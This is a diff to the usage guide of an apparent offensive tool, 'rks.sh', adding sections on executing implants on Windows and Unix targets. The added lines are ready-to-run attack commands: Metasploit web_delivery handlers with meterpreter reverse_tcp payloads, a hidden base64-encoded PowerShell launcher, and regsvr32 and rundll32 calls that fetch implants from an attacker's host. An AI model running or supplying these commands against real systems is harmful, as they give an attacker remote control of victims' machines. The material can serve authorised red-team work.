@@ -67,6 +67,8 @@ $ ./rks.h -c recon_cmds.txt
 
 ### Execute Implant
 
+### Windows
+
 - Execute an implant while reading the contents of the payload in powershell.
 
 ```
@@ -77,6 +79,14 @@ $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterp
 $ ./rks.sh -c "powershell.exe" -m dialogbox
 
 $ ./rks.sh -c implant.ps1
+```
+
+- Execute an powershell oneliner implant using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
+
+```
+$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
+
+$ ./rks.sh -c "powershell.exe -nop -w hidden -e <base64_payload>" -m dialogbox
 ```
 
 - Execute an implant with `msiexec.exe` while hosting a webserver.
@@ -112,12 +122,22 @@ $ ./rks.sh -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0"
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
 
-$ ./rks.sh -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sct scrobj.dll"
+$ ./rks.sh -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sct scrobj.dll" -m dialogbox
 ```
 
 - MSBuild
 
 Coming soon
+
+#### Unix
+
+TODO: Fill the missing info
+
+```
+$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
+
+$ ./rks.sh -c "python -c \"<payload>\""
+```
 
 ### File Transfer
 
